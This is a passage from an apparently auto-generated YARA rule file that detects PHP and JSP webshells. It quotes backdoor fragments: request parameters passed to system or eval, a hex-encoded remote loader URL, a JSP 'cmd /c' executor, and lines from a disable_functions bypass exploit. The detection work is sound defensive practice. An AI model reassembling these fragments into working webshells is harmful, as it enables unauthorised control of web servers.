      $s14 = "$__++;$__++;$__++;$__++; // E " fullword ascii
      $s15 = "$_=[];" fullword ascii
      $s16 = "$____.=$__;" fullword ascii
      $s17 = "$___.=$__; // S" fullword ascii
      $s18 = "$___.=$__;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule webshell_php_5678 {
   meta:
      description = "webshell - file 5678.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6c31195a7eba11f41260c6a683e2e6cf74dcd8c9210c38820c9df93e0e49de4a"
   strings:
      $x1 = "$info='7P3ZcuPMsiUIv0pb2b/N6r9pwyDqfLK2ukgkAVJQAhSGCBC4IwFaQsQgpkSJFNvq3duXB0CC1JCZ+5xqq4u2GnbqI4khwsN9+bT8//g//n8zTZvNtP/x8lQXq" ascii
      $s2 = "zJ/kz169WQde1NrjX7LrOMDw+f9fMlM6/BxVy+F7ruVtOpBvqgkmX2k9fKW0hqJiRMEyegWfwvTuZvNnVtvMspQLzgTzmhZ+/NU7O8VniRcPPSHnKKMHR/9y3uVrzj3f" ascii
      $s3 = "L3OzNYH8cz5OS3Wr8XzPd/XFH5/6vv7sPympN7bKr/kPInulB/T7xa/lPyf5634NaP+8PMGfKLIPT70xKeY+Hkg/o7lR+DP4hPW4b9y/gvf6t7Rb7X6U/jdqQU+0lN94" ascii
      $s4 = "fTPPn8hc32p4qf84KTPW8Onll+x4rf7J2kenvwapYuaiJ8q/62F+JOs/4AvgPfSr2C+3kTriXhyUn82+CtbfAL/Ae84iF/VbZNP6flLf4//8Yb+pfi08sd2vx7Fb+rVg" ascii
      $s5 = "f79SZ5t+hz68Vqqz19QHzf4HOsT+vB3aL+wnr6KZ3D9O+G5e8X/cjkP9eYa8ZE+/5DYe+7PTITfx3c4HnFen3+U/1HG+QeSf/AFy9v9LNHJ/ljVB/sx6eY/fig/C45Pc" ascii
      $s6 = "sPyvdao6qehP/BdvJR+6DLvW1qVfNRTT1RPHsfT1jRptPpZjXphIT01fA87r92fKf7w9z/Ek+edb/3J5tvD6OyHDv/u9tT3/skfoX/RkV78kEw1r6h54X9KfN9M8j+ZN" ascii
      $s7 = "3T+rZXY63lsq3pWswQv5nfYe65n6OS95yP3J5mekf5MxB+977A/on/fo35P+35RjftPwU86xjydvArU53UtV4k7U/zxO9THjz+ovy67foEgs0fj2CF9ifqsXt8mBfz/7" ascii
      $s8 = "uf57c7Pb/UD5edHvy4J85TnDfev8ftPNE/Jnv+s1Pws4v/hPD+CeILesuZ4LPM8Uvx+NZ8k6GPIh2s+P0j9Su837vBrbUo3H/of1H8v8PHlfyH+H/0K+f2hD/vs+ptEf" ascii
      $s9 = "f4p+guTjPyPMlzG1oH8BfRvId8CfAD56PLTdD6E29eL38OfFrjf2u7rzc3lUR8TXjXf4+ngy/Pj3/b9bzg/s8kz4uvpckx4lUwBybOJ+AnZ41eB82Ce4kn8ffTPJ2Tvg" ascii
      $s10 = "r+xwzxJ+dWqn6X6UPiSPy/0Q2f9uPBk50/Jn9v1LjPxgzxuv/mbqX4fe30tv3HO+7PfsfhZof85d3wEvqP89PFDh4+l/hz4hOa5y+/2qP0lv07ndyv/gq/t8zGcn9iQ/" ascii
      $s11 = "TVC1fPS/ooHyIvjFUk2mc39sZg65Wpu3cq1FRRzp/Em2SPyPZ+en+az/IU9KirytwXsd831PuivIn/vnA9u4h7r+2P4ZpPiov58fxYvZj6kZIR4MHn6zm6WlDH59jX4q" ascii
      $s12 = "/X89H7db0T9/8CvJd+Dbw+/5SA8TXqirc8zDf106WflfyQ/KeHBT+d8wuOJ9j/zcQbyc6jk6/c5zCf3/nSjkp+P5sFEmi+TMT+J+W2WTx/wTxv6fEmfr4Z/NP5AMXxp9" ascii
      $s13 = "wV579reobVt6HOP8PLxeVQ858YUjftE+OmO18fu7jd1Huh5Jll180z/v4pfJGw/HqI14jeMJ/aEoAmvWtcdnnhhPLG27pfD77dlloqM8Ug4GQGPkD+Ymfx8ZL9CzSegG" ascii
      $s14 = "i0fsfNuu2/Rf/T1pXrgeTjd14d5NUMPwXq1/ZSTDy7a8U58mLblwz/O9+5DvmfXd/E+r1d/Dzeu5xg0vo+XXuiRfobXnvFli8+H0p7z02Lz52vajnv0S34Rv+uF77+3+" ascii
      $s15 = "721V8t3m6yftHaIrX5nPdzMbf8kDdtrjf7ruFq82NkVpXm0SbLRp9tT7+377fyYTop2E7wn7Vr+Ew2/ytftPI3KJ+XrnOfd4g97/5nl05ff9/dyt/wyrkXJ3XZJPv087" ascii
      $s16 = "E2+3+Vv+zPlehHP57Z8OKl1R/Z/2OlzqfnW2n0Mm+EvZb8E3Q89Msf2sR6o51J+Cz4AFV+o+dgrPYpzv6jDN108P9H2M/F8xTleoGeTZuN0vhqTxUlCN28oLlL9VspH8" ascii
      $s17 = "0kt2RT2jsvp/6+4b2tOW4m6/CtT8zZvuphMXFMzU8FICBEJ69It0BtIlBV0MbFxwPz62Wu3BIJgJ/lmvpqHUzkUF0ut7n1dey2/fDbIllJ8NiiWG6En0ElOgMbIXoKN/" ascii
      $s18 = "9QvPnuT/TqvwKsPvmDwab3Ho3kyqkIZkH0n+TAL5JtN1GsVlXiDv/uZfL+L59W+JL8L89eYfw/x97B9Zx/uw/86vNLr2+F69vOKAtT7iknoyIl0w+T0ffTPcD7tEg9cy" ascii
      $s19 = "8ufSPxYxS3XP+s8p5+zVP/A5w825Wcd/DIP7oeheeAnx9eZX01/rS8/DPhw6MXwl3b+Ivkb/74lfTp8Ec2LbRTokcRnzIU/XMlvWutdeirxUzVPxv17hC+p/6n1uTl4v" ascii
      $s20 = "lsfw5/FN4vf0cLqZotvszyfNbMoPyRF71RO08mwnnNeREmxTJfTPvthaOv7YOthO5qu4JX17X5sPzJH52DrMb7Pd2VrGK8myyl5eVjfeVHPt1a32/MN8TLN8c22/WzXW" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_2022_09_09_05 {
   meta:
      description = "webshell - file 2022-09-09-05.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b814c6881cbfdbc02e0e91421877907ef800243bad75ac28276b49ad97c031"
   strings:
      $s1 = "file_get_contents(\"php\".$q)($_GET[2]);" fullword ascii
      $s2 = "$q=$_GET[1];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_general {
   meta:
      description = "webshell - file general.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d73ebe1be17fd1d7c8ca45ab5311114d0454e079713f9a42ee6e7cc4dcca543f"
   strings:
      $s1 = "'kRhhiDjNZeSodQSTiUSodQqTa5qJdUjhiDjNZeSotDYZr5qJdUMPfjhICDjXrQAJsU7v6E9J6'." fullword ascii
      $s2 = "'Ok2CweE8QOFpQj2ZvkT6lkT6Bqv65sXbmAv67tv6mqTswuNpmqvah6Ozksecwz5pQANp7yvKeyeC9nIkRhIOqM5cUjh'." fullword ascii
      $s3 = "'JHIkqfTphuNpekhaQQEaw43W7CEIU7vKv8PfjhJiEcX6qVvIDK3Rn6vKAkvqnsZ69cPfjhJiEcX6qVvIDRX87R5ph85sU7viQ'." fullword ascii
      $s4 = "'OjhIZAgIOqs5ZD8Jt9kh6DBT6WHIkq7IkqfTphuNpek5dEy2rDMXb9kJbEAEtEsJIkR5pmB'." fullword ascii
      $s5 = "'qJreHIkq7IkqfTphuNpek5dEy2rDMXb9kJbEy5IkMIkqHIkRhTihmviug'." fullword ascii
      $s6 = "'a8NZOk2b7SXpay5UjhIZAgIOqs5ZD8Jt9kh6mY5ZhsXrvHIkq7IkqfTphuNpek5dEy2rDMXb9k'." fullword ascii
      $s7 = "'hbQYXp8qXdOdPkjgIORhICDf2ZDA5ZhyvKAkh8fjZIRchzugIkjhIOqV2ZQqvITA5ZBAhzjgIORh56Et2ZEuTKjgIkjhIORhhi'." fullword ascii
      $s8 = "'FswMJ8QAJtqy5AaAT6aVN68qXdOgIORhQcU7ocUR56qzJ67zNZDMXb9uIkRhIxJkox9keUjhICRHIkq7IkqfTphuN'." fullword ascii
      $s9 = "'7yZb58XtQANp7yvKAkhsJHIkqfTphuNpekhaBQ2pqu5ZvkoCUdhzugIZwsXrDq2rDq'." fullword ascii
      $s10 = "'O3qegxugIOq7Ikq7IkqfTphuNpek5dEy2rDMXb9kNpDy3rEfJ67sT6ERgIRgIZugIkRhJtEATZhyv658X'." fullword ascii
      $s11 = "'vIDAN6qzFxmeDxugIOq7IkRhJtEATZhyvIDs5ZQ8XiOHIkq7IkqfTphuNpek5dEy2rDMXb9k5bEA3bEyTW8hx3EQ5ZQ'." fullword ascii
      $s12 = "'JHIkq7IkqfTphuNpek5dEy2rDMXb9kNZQDXpaMXIkMIkqHIkRhh6qyNE7z5pmRXpaMXa7f2ZD'." fullword ascii
      $s13 = "'7IkqfTphuNpek5dEy2rDMXb9kJ67zTaQqXtOjgOjhGfjhIZDsGCwHIkjhIOqzTbqA2bkkgIDAN'." fullword ascii
      $s14 = "'ZhDTpE85pDw56Ds5ZQz5ZejhrDYhsRHIkq7IkqfTphuNpek5dEy2rDMXb'." fullword ascii
      $s15 = "'gZws5pT4XpaA2bkjhs7XZik9eI8JGW56ZCldFIURT6E9TIRHIkq7IkqfTphuNpek5dEy2'." fullword ascii
      $s16 = "'gCRHIkq7IkqfTphuNpekJrDBT6qVv658XtQANp7yv6mYJt8BX6q153hs5pa0JskRT6E9TIfkh6hs5pa0Tiqf5CU7vIhJJqnyvcR'." fullword ascii
      $s17 = "'97vIDcTp2kFcwz5pntPVMK3Rn6PfjhIZAgIOqs5ZD8Jt9kh68qJrQB5b3HIkq7IkqfTphuNpek5dEy2rDMXb9kTZ'." fullword ascii
      $s18 = "'x8UdFIUdxR7o3IJuvKv8eIRHIkq7IkqfTphuNpek5dEy2rDMXb9kTiEsXckMIkqHIkRhhiDjNZeSodQqTWEsJt7sgIT3N63k3A83'." fullword ascii
      $s19 = "'q7IkqfTphuNpek5dEy2rDMXb9kNZQx5pmRXpaMXIkMIkqHIkRhh6qyNE7z5pmRXpaMXa7f2ZDj'." fullword ascii
      $s20 = "'fTpmm5pmVXbDqOpDRJtEzJskRT6BMJsA+h6aR5ihqJrQ4Nbqy5IRHIkRhIOqM5cUjvCDAN6qzFxmb2pnM56aA53aR5ihq'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      8 of them
}

rule system2022_08_22_4 {
   meta:
      description = "webshell - file system2022-08-22-4.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b03e26bc957a9f7c0c666804f3200756c965a97516e5f40e489a1de30c4822e7"
   strings:
      $s1 = "array_map($a,(array)$_REQUEST['1']);" fullword ascii
      $s2 = "$result = array_diff([\"s\",\"a\",\"b\",\"ys\",\"te\",\"m\"],[\"a\",\"b\"]);" fullword ascii
      $s3 = "$a = join($result);" fullword ascii
      $s4 = "//ASRC" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_404super {
   meta:
      description = "webshell - file 404super.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4b60f56db6446f7f775346a754402cdfc632118ff578f50e297f4a7b5a5816a2"
   strings:
      $s1 = "//http://require.duapp.com/session.php" fullword ascii
      $s2 = "687474703a2f2f626c616b696e2e64756170702e636f6d2f7631" ascii /* hex encoded string 'http://blakin.duapp.com/v1' */
      $s3 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSION['t']))));" fullword ascii
      $s4 = "//define('pass','123456');" fullword ascii
      $s5 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword ascii
      $s6 = "ini_set('memory_limit',-1);" fullword ascii
      $s7 = "$GLOBALS = array(" fullword ascii
      $s8 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword ascii
      $s9 = "//**********************************" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule simple_2022_08_15 {
   meta:
      description = "webshell - file simple_2022_08_15.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "874b326e3ef5a98e736c6841bdb6f045d7dda3b083b8474b8d4595c2a8490aab"
   strings:
      $s1 = "// running -> system('cat /etc/passwd');" fullword ascii
      $s2 = "$_=$POST['1'];" fullword ascii
      $s3 = "$__=$POST['2'];" fullword ascii
      $s4 = "$_($__);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule bypass_safedog_2016_08_29 {
   meta:
      description = "webshell - file bypass-safedog-2016-08-29.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5da4e6588b67ef842ccbcb38a88caeee93dc2342d1132b58642ef6d65e9952b6"
   strings:
      $s1 = "$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);" fullword ascii
      $s2 = "$poc($_GET['a']);" fullword ascii
      $s3 = "$a=md5('a').'<br>';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule bypass2021_01_04_01 {
   meta:
      description = "webshell - file bypass2021-01-04-01.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f26c2a86c7874be2a6d99eb9248355c9a682f8983e472125e0a9c31495743131"
   strings:
      $s1 = "    return \"/*sasas23123*/\".$_POST['a'].\"/*sdfw3123*/\";" fullword ascii
      $s2 = "eval(x());" fullword ascii
      $s3 = "function x()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2014phpspy {
   meta:
      description = "webshell - file 2014phpspy.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "920d76d47fcd93b760ad29d478f1a99975b929985df1f969e4c264a441b8beb6"
   strings:
      $x1 = "eval(gzinflate(base64_decode('3X1rc2PHdeBnukr/4Q4E6wISiBc5L3LIGQ7J4XDEITkEOS+SBV8AF8AdArjQBUAONZ4fk02qkt3sVizLr8SKtbbklaU8pI0de3" ascii
      $s2 = "UHIMkqC1dXl2+tPCx2NqB7qAjMX+ut92udqzQ/VkFCOLe3Dmu9u/6jh1uHTqXN1XjzTkOOjspBFJUGH3xvUi08KIYabUv8liRuNYC1FtWs1+/Uu1d8lBINlAKVp282bt" ascii
      $s3 = "JgbvB5ZdWWQV3iKvVZF7liKX2mFOxR0OHYQYapRlpo0GcvsryL5vj/TBDFVcIxkgh2bhkR6CzSMDlL2bXCeGbkhqNGpigI2pysbHQKN5eq1jpO74DmQBIbNBEwHFg8M3" ascii
      $s4 = "/PNju+M5zpuM3hLOg+oNkdz9Q6fv1g9shrwBpUuhi22mRAxKkdsYkbgXfoDp5pfaclU+dYkmtnNPStywxwrUCSmkR2PfD6Q11mP3EOHU5F0a2UqnrbrR84nU4Gm18oXH" ascii
      $s5 = "pxXJDw7A+IpXGzIRcde5/c1c2kUCSNv6MsVCH9ijIQNy8nM4x5N5mDpJCdgzEHu/RD4q32Gu7TfeEAyoNbakNpPbSK6H3lENgA3pH7mURXEi6VLWJipQpNcCJBXzepOC" ascii
      $s6 = "p0cvTHVnzYOQ06wiy2Vt8Nupk+fstZh05H5xqzBMv4VeN3cRQE0AbIZgFRZ+zXiMRr9l7PqAugWojrkR16gBXBQvSaYPbYakgO7RyzKOEjFQlIqcuAlKJqanWQaqCoh/" ascii
      $s7 = "Qyg+wpwKhRj5OpaNGTavA4mJM4Ssw7WdaREVGouLv2fTp9SuhEA1qpruMRnp+RabOX0AamemcvlWLnpdSe6biEGapGIOmvgpC/LMA09W4vFboe7En5spcq7aVk9Bspj/" ascii
      $s8 = "DOzStukIuuc+C2PTwNRHt8jjavZjrZ2yxp6QnT+yVM5s27llqm1HIkdYpSpyKp05Q6HSlPGPlzlm4GR46bvj/MqMOxuG0LjRlPq6BmuC2vIU0y6dHARSPqDTqz47W3im" ascii
      $s9 = "EyE7JGu5noOalYJHKsX8/Nl4s5m1ZYvBDJmdmQIl04PZUirSCKYumiQREzNYqwSg9Op8iRLsdQpKiTyRQklL0oL5TZFIUOUlhTwDCJqNthSk2eF9Oy3lcnV7yu8HqLIl" ascii
      $s10 = "fVOZ3xhAIptLoGzHFkPA+bgGWuw83j1QaCzZqodVhUhi6qjVnEx9r33CNhRMQiw1+oqwV+tz/M2Jugy4G6QCufNWy7aHWExc8Pji2EnKF9LmkY2BYXQhpZiznErFamN+" ascii
      $s11 = "0qAr2uE4BaSd+tolWmD4OhWyX8n5xeEc6fkzrVfSaoFBXfNF/a5aQMOb6noXRd1FACMY8SfaaEP8VsuXjz0pVLt5DkqEMVsTpeSFoATU9Px+np3xH9WXROWDSBBInLly" ascii
      $s12 = "UOUKls5LU3rwo1v3FMX9BiN4/jRHTGS18ovDr3Qv9e+sLv/c5Hn2IgnBfDf7WApYcPPMoZku7lVByv9KE6Ej1UJ6KHMV24N14N1h48wxGHtww1XVjFvj3MWam9XioLWq" ascii
      $s13 = "vIShhQy1Z1ElcSSXi9emfUcMdREdkaIek90O6r5bIIhIUUR7dv/AWiTyk6oI/gBSPnWhn+qKd7wuta7f5u2tmHnj+f3Y81nbm5ojQTibtM+OTQtbmr+sNDyo52bYQFIh" ascii
      $s14 = "7Ty5w/ZciKscmXQpCNqp3PUFdA218vzpTUDJMebDxM88qAoKEWbbySwpex8NZfNhGqROaGC5gD0CMN2o6xrxaKS6hEnLEqZMEdW4813foZrwwjn1gTBinZ52C/eA72cX" ascii
      $s15 = "MTkwUMSxN6vNLihyIBCznSRIE2/kkqC1OfNOFRRnLl+PlKriAdXpkuuiQwOeUU3gW6xOdH2MQ0ZVNu6COMPsQRl+ASH50Z81pklc9eUfb5NasZvnWpPxMa6ZIo0BmaT3" ascii
      $s16 = "$pass = 'phpspy2014';" fullword ascii
      $s17 = "ls/kmPvIbI7R7Dd5Ha0lJbYSpo22iBT11PmaZPSUVx0D9CWuFvl0gbtFVeK2iZsK0Qlunix64Nf8g0qqrEyWyS0Sjjx67dUtCSa05X4NJKQkPLIr15LlUqFr+YsngbMZ" ascii
      $s18 = "8xGHCLvH/BaQ2JBUjchB3OYBH9HUQyQKFZVEi2iMHS3EzrhknBTM8/Cpz+/DU+5xQWytqQG0iMYtFC8hcL79Qd+Gnhb551tRH0Uy81H9KXps+J0PRgtK0aqC/auHLkSD" ascii
      $s19 = "g4INlKnHfge1cmJR38EWjpIy19xOmjYXPyiiwBflzh5COv1/CPBpOl8sVytBAewWmnPoRm8AY0FDd3bfgN0xQntvwB4516UbabAS7SQhSVgGhYV5qWPshsA49SQizxUx" ascii
      $s20 = "H4t47EMckMJBEVTCGJIGAakrg/rCOFTtP67xBJ3f408FRqiKolhcHqhHWOg9yhpXCEW8gwbFlIseYcVNk3PgzeZaSJ3dnSTWAEr2Uv3azePa7cW5uV6ZPzevjC8D5RHE" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule wsoExGently {
   meta:
      description = "webshell - file wsoExGently.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b497ff734e7fbd882f48c46de57777fe830a1b81d46a8eddf81e9174c1f3c27a"
   strings:
      $s1 = "# Author: https://github.com/mm0r1" fullword ascii
      $s2 = "# PHP 7.0-8.0 disable_functions bypass PoC (*nix only)" fullword ascii
      $s3 = "6d6574737973" ascii /* hex encoded string 'metsys' */
      $s4 = "647261646e617473" ascii /* hex encoded string 'dradnats' */
      $s5 = "# This exploit should work on all PHP 7.0-8.0 versions" fullword ascii
      $s6 = "# Bug: https://bugs.php.net/bug.php?id=54350" fullword ascii
      $s7 = "        $fake_closure_addr = $this->helper_addr + $fake_closure_off - $this->helper_off;" fullword ascii
      $s8 = "            $this->write($fake_closure_off + $i, $this->read($closure_addr + $i));" fullword ascii
      $s9 = "        $this->write($fake_closure_off + $handler_offset, $zif_system);" fullword ascii
      $s10 = "        $this->write(0, $this->abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));" fullword ascii
      $s11 = "    private function get_system($basic_funcs) {" fullword ascii
      $s12 = "        $this->log(\"ret gadget = 0x%x\", $ret_gadget);" fullword ascii
      $s13 = "        $binary_leak = $this->read($helper_handlers + 8);" fullword ascii
      $s14 = "function wsoExGently($cmd) {" fullword ascii
      $s15 = "        $this->log(\"fake closure @ 0x%x\", $fake_closure_addr);" fullword ascii
      $s16 = "# released as of 2021-10-06" fullword ascii
      $s17 = "            --$ret_gadget;" fullword ascii
      $s18 = "        $this->write($this->helper_off + 0x38, $fake_closure_addr);" fullword ascii
      $s19 = "        $fake_closure_off = $this->helper_off + CHUNK_SIZE * 2;" fullword ascii
      $s20 = "        $this->write($fake_closure_off + 0x38, 1, 4);" fullword ascii
   condition:
      uint16(0) == 0x230a and filesize < 20KB and
      8 of them
}

rule sig_20220213_05 {
   meta:
      description = "webshell - file 20220213_05.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cf94677ad1107a2551285ccde8795445034dfa2f8ca316574fd1b9cb028f4faa"
   strings:
      $x1 = "$info = \"7P1pc+patyYKfr8/I6N2RFU44m7RyDZxK6MCZCwa0RkvJPFNCBsQ2BKY/kb+93qeMSUhMPbyes8+5+Q9mbG3Y9kgzXbM0T5jzP/j//v/i6bR//H/6mhap6" ascii
      $s2 = "3NqNtSV807TzGhLHfgqOHjiB6t0ceR0wTdUU5Z+BfFvXHUGHZeIYFcwgeTzsAe0ZMENeXcTHGiRjnJ15I8idA9+KzwvmgbiN4K5Efa+gTjB8wvo2zST+Cy5w30s9AcgU" ascii
      $s3 = "X5t+jJe6BdYUjmIIby7rH314Nwh4C5CSI8QbwLuActdAPAPvGGoVrTO4UnZtBinU0EyectQnPHRw840k8AyeJOpo0xuBIesJ6i2OIjia87hmYfzSgxWtDg1k6YeTbffY" ascii
      $s4 = "mIPqbbKDFRD9dfeb8PvxaOnz/7ppm0ziHi8HCz5wejN2Hs6UbG6fTPeIvmo97t09/o/OROHHB7Lo2TspVgRnD7zvnKkccr5ejNsv+Z3p7/xosGz/f3uYd20dv/eI8Yf/" ascii
      $s5 = "6/97ekRqCP7ALTufn3C5IP/8dXtqkj+wHsSNZF/Gnnccm0s+vx47yf4rLZnsqxvm5H6Uf/zZG9cOYjpzvKzGd5PPfxnT+wCbNnr3P8/oPwGeTHn5rw6l7lWN7LbZ7stj" ascii
      $s6 = "DQefJ9Y2Oo7Fk8yKJPy39fGHe6WNLnRGMhs1bMCDSH8ZOoxWmenVcPSPy+LW9EHsOdkw42qzq98JS9cHvxalVqkaCnro4dNTtN3vhfHxpisfED4hqlLxHuLtE5YpPVZd" ascii
      $s7 = "enoLly26abgxG82Xz3mK8ovlQ+ZqtDXcOf/uSbS6HD6VM0Pmh/YP3zX0v0oHZ12pnNOxVXurBbZQPeU2vbf6l3P2YvV3E72Ll9PjW+Ujn99oz+5eyeJL7TeXd+1OOolq" ascii
      $s8 = "+F3eXJ85RsPkjYiEokxj74L53XYlLuwqPKbgpyk/B87Bdb10XOoAOT9Q/eK/0AdvM21M+muCLjFtSpybujfnjxFgJfjGP9SFuskB9yZd8SozOZg414xmwi82y8F1/BFr" ascii
      $s9 = "jfmYVen+OmKPWjD6zLu0ZSJPpahvw71D+Ntv1qg99XQ+W+Rl5Sodtt6Q/M8/fvXJJ+qVez3+h26/wDjHktL9y5zGnaNesbiOn7BtjrfNk5ow2cU7Q8ctmsMTPS9u0HN8" ascii
      $s10 = "Ov7+iL2e/E9xuLtwPZqGyS9j3d/ZO+v0X4/7K3uF339k76fdftPuNvYP5VL63d7gv39g7bP/S3vl4FF9mOvZ/2N7hHnxr77DPL+wdvvvJ3uHz39o7XIN/m73Ddf7e3hH" ascii
      $s11 = "wFvzq2vNmOCoVwtHHq6/pWtMyZkst+HjcO6tJZbuwC61ZD2zGrjm1MDd/6Qb8/lh1KouO73bavWbuEGKP/LbfN7Wy1nS26755f/Z9q7x4NprB06MdLLpOS9tWwuoyrz9" ascii
      $s12 = "ndZ/A+dsXzxv9/e58zTdKSbu3ice9unNH/tn3OZELNTHtCx9qYvIHo7Eye3LMUZ985LN827HW5Hyp+bZRytg1k+TUL+V7Yq429n5YlIJK4ylz02uFtbKlxi3apyKfpYi" ascii
      $s13 = "69T2xhi+rp/a5vvBuz94UPyzjfI5+NJ4UU3ihE2Zo65KOElr7UFgPGTfaVDrNBZ1ldA/nKr2FtpnQW4YmvjoDxXvw5tl2bOyUfY3v2g5xoY1sv5jLVu/nu/jsDbrhSx+" ascii
      $s14 = "QDx6+gHITxJzU+9pgaj3qJKrFqHeAdEXII5DDM78V/Cl7bo5+kkn1fshRA0GvknpQX3XGjDRW0XIHn4+WH3lS/Ck0LmpZcogZejjBUROP1792vX1DPAt8JQ/tOXyJTLY" ascii
      $s15 = "j6FwWuLy9LVMue8TmMhbDtSRux6IOQ/wHY4GB+DWJG2DMCXoR9VvwM5PxnpnMaQ+Zp0WQjdh7YswZN4HtyHg882FJJ8Rne+KfIe6dvJZYFWJ9+Dloglgexh/3PD+gb5W" ascii
      $s16 = "L5Ny0tslqq3znqo6C4KvRblrP9mq7Ban7fLXdpD6tygfyOpJ/NMy5sS1/NX8a/c2S+sEX+dPoS+r2J/nMyfisbkXhlK7W88c4lkN1X+vVNnHeVB2C5J71XIexkBZ5geT" ascii
      $s17 = "0Jbkih0T/ps8Ve2CXD+I7NMFXtVDnv2LfsF9ZO/rcsB6U64yxi1+XvkHwCRd0OIqUPbkf6Vhj5U+jTw88iPvo2+WR2LH0o9TA7zF2X56B/gC9AHoT6YS0DLlC+qaPBWd" ascii
      $s18 = "yvnpV7yC2E45xTl8AXaj03q08JTWg4lpYlO1fPpvYAepZ5gs8k0dtxJ6UmmHZPPDC9thvesfoOeZj9ufnz/++Z72VtxbtFsqf57gmHLHBMS88rdNZrih0zPlLWtvrcLl" ascii
      $s19 = "MIR1uLCP/0V5ancIyt3ieDDdTQ1sMu3n9dVvxfk3y21dDW9agh85b8fr0RvNj09r2Hp11124vl2Hbj//eVUGbUyM3L3Rr3ms42uyN5kfH0ZYPTauD94Pocd+Z+7n5rBl" ascii
      $s20 = "Akw2WxfSPcrafKx3s3E58YbevN4Xb7mGuHxuLhLZV24HEVa7kpl3oUnFOD3Qp6Dvp2aQuthwG+afd8V5kdm/9AR58nOShKwXcZ+qdAfVdxms00Cv+LtdiXWFFXaF1RVe" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule bypass_dog_2020_01_30 {
   meta:
      description = "webshell - file bypass-dog-2020-01-30.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7a1b697374a58867b2d3d9d5125d55111a4e728b360f436e7d6e8e54b8b150a3"
   strings:
      $s1 = "  public $x;" fullword ascii
      $s2 = "    $this->x=$_GET['nb']; " fullword ascii
      $s3 = "  function dog(){" fullword ascii
      $s4 = "preg_replace(\"/dog/e\", $a, \"I am a sb dog\");" fullword ascii
      $s5 = "class SBdog{" fullword ascii
      $s6 = "$class->dog();" fullword ascii
      $s7 = "$a=$class->x;" fullword ascii
      $s8 = "$class=new SBdog();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_jsp_in {
   meta:
      description = "webshell - file in.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
   strings:
      $x1 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = "Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s4 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s5 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s6 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s7 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s8 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s9 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
